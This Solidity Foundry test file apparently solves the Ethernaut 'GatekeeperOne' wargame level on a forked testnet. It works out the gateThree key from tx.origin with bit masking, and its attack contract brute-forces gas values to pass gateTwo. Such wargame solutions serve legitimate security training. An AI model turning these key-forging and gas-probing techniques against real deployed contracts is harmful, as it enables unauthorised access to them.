// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {GatekeeperOne} from "../../src/ethernaut/13_GatekeeperOne.sol";

contract GatekeeperOneTest is Test {
    GatekeeperOne gatekeeperOne;
    GatekeeperOneAttack gatekeeperOneAttack;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mumbai"));
        gatekeeperOne = GatekeeperOne(
            0x9Bab40648AdF1679D8fA674304DEf79701884ff5
        );
        gatekeeperOneAttack = new GatekeeperOneAttack();
    }

    function test_attack_gateThree() public {
        // part one
        bytes8 _gateKey = 0x1234567887654321;
        uint64 test64 = uint64(_gateKey);
        console2.log("test64: ", test64);
        console2.log("test32: ", uint32(test64)); // 0x87654321
        console2.log("test16: ", uint16(test64)); // 0x4321
        // The first 32 bits have no effect for part one requirement
        // And except the last 16 bits should be empty
        _gateKey = 0x1234567800000021;
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );

        // part two
        // if the first 32 bits is empty will fail
        _gateKey = 0x1234567800000021;
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );

        // part three
        address testOrigin = tx.origin; // bytes20
        console2.log("test160: ", uint160(testOrigin));
        console2.log("test16: ", uint16(uint160(testOrigin)));
        // last 2 bytes should equal tx.origin last 2 bytes
        _gateKey =
            bytes8(0x123456780000ffff) &
            bytes8(uint64(uint160(tx.origin)));
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
    }

    function test() public {
        address owner = gatekeeperOne.entrant();
        console2.log("GatekeeperOne owner: ", owner);
        vm.prank(0xF16Aa7E201651e7eAd5fDd010a5a14589E220826);
        gatekeeperOneAttack = new GatekeeperOneAttack();
        vm.prank(0xF16Aa7E201651e7eAd5fDd010a5a14589E220826);
        gatekeeperOneAttack.attack();
        owner = gatekeeperOne.entrant();
        console2.log("GatekeeperOne owner: ", owner);
    }
}

contract GatekeeperOneAttack {
    GatekeeperOne gatekeeperOne =
        GatekeeperOne(0x9Bab40648AdF1679D8fA674304DEf79701884ff5);

    function attack() public {
        bytes8 _gateKey = bytes8(0x123456780000ffff) &
            bytes8(uint64(uint160(tx.origin)));
        for (uint256 i = 0; i < 8193; i++) {
            (bool success, ) = address(gatekeeperOne).call{gas: i + (8191 * 3)}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                break;
            } else {}
        }
    }
}
